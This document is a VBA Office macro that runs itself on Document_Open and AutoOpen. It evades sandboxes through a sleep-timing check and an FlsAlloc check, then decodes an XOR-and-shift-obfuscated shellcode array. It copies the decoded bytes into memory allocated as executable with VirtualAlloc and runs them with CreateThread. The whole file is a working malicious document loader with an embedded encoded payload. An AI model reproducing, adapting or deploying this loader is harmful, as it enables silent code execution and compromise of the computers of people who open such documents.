Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

Function MyMacro()    
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim xKey As Integer
    Dim sKey As Integer
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Function
    End If
    
    fls = FlsAlloc(0)
    If IsNull(fls) Then
        End
    End If
 
    ' Encrypted Bytes
    buf = Array(243,231,14,255,255,255,95,172,205,91,2,77,175,4,216,2,77,131,2,77,139,172,254,2,109,167,142,54,69,153,172,63,35,179,92,115,253,163,159,60,206,128,252,198,68,104,238,77,86, _
    2,77,143,2,189,179,252,207,2,191,119,120,63,107,67,252,207,2,87,159,2,71,151,79,252,202,120,196,107,179,68,172,254,2,171,2,252,201,172,63,35,60,206,128,252,198,183,223,104, _
    235,250,112,247,178,112,155,104,223,87,2,87,155,252,202,89,2,131,66,2,87,147,252,202,2,251,2,252,207,4,187,155,155,82,82,92,84,85,76,254,223,87,94,85,2,141,228,127,254, _
    254,254,80,103,97,88,107,255,103,118,100,97,100,75,103,67,118,153,134,254,200,172,210,74,74,74,74,74,231,111,255,255,255,64,110,117,100,99,99,92,174,168,161,175,159,167,86,100,97, _
    91,110,118,106,159,65,75,159,172,175,161,175,178,159,86,100,97,169,171,178,159,119,169,171,164,159,188,111,111,99,88,86,88,93,66,100,107,174,168,170,182,161,170,169,159,167,66,71,75, _
    64,67,163,159,99,100,98,88,159,70,88,90,98,110,164,159,186,103,109,110,96,88,174,172,175,183,161,175,161,175,161,175,159,74,92,89,92,109,100,174,168,170,182,161,170,169,255,103,181, _
    73,116,38,254,200,74,74,101,250,74,74,103,50,252,255,255,231,50,255,255,255,174,68,188,67,169,98,87,98,71,67,175,97,76,184,180,184,74,107,67,73,98,169,188,185,160,67,96,108, _
    94,90,108,118,98,119,118,90,99,169,67,97,66,111,105,255,79,103,86,4,30,57,254,200,4,57,74,103,255,173,231,123,74,74,74,86,74,73,103,226,72,161,178,254,200,9,101,133,94, _
    103,127,170,255,255,4,223,101,251,79,101,158,73,103,104,185,17,121,254,200,74,74,74,74,73,103,160,249,151,114,254,200,120,63,104,139,103,7,138,255,255,103,187,239,168,223,254,200,78, _
    104,192,231,66,255,255,255,101,191,103,255,143,255,255,103,255,255,191,255,74,103,87,27,74,216,254,200,10,74,74,4,230,86,103,255,159,255,255,74,73,103,141,9,4,221,254,200,120,63, _
    107,206,2,134,252,58,120,63,104,216,87,58,94,231,98,254,254,254,172,180,173,161,172,169,183,161,171,168,161,172,180,168,255,50,223,144,165,133,103,25,8,48,16,254,200,179,249,115,133, _
    127,242,223,104,248,50,70,138,109,110,101,255,74,254,200)

    ' XOR Key
    xKey = 70

    ' Shift Key
    sKey = 185

    ' Decrypt XOR then shift to the left (-) as long as it's the opposite of what you shifted to start      
    For i = 0 To UBound(buf)
        buf(i) = (buf(i) Xor xKey) - sKey
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
 
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
